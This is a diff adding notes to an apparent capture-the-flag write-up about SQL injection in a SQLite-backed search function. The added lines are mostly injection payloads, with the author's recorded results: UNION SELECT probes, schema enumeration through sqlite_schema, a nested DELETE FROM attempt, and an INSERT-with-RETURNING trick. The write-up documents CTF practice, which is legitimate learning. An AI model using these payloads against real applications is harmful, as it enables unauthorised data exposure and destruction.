@@ -100,4 +100,19 @@ def search():
 - `a%'union select "1"/*`
 - this does give output so there is sql injection
 - ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/df4d2a1e-53de-4f99-b249-9683cca1866e)
-
+- `a%';union select "1"/*` -internal sever er
+- `a%'union select "1" from (DELETE FROM table_{id})/*` -500
+- `a%'union select "1" from table_{id}/*` -500
+- sqlite_schema
+- https://www.sqlite.org/schematab.html
+- `a%'union select name from sqlite_schema/*` this does give a lot of info
+- ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ace9ce66-2470-4753-8f09-966567c1c3ac)
+- INSERT INTO table (column1,column2 ,..) VALUES( value1,	value2 ,...)
+- `SELECT name 
+FROM (
+    INSERT INTO mytable1 (col1, col2) 
+    VALUES (val1, val2) 
+    RETURNING name
+) AS inserted_rows;
+`
+- a%'union select name from (INSERT INTO sqlite_schema(name) VALUES (1729) RETURNING name) /* 
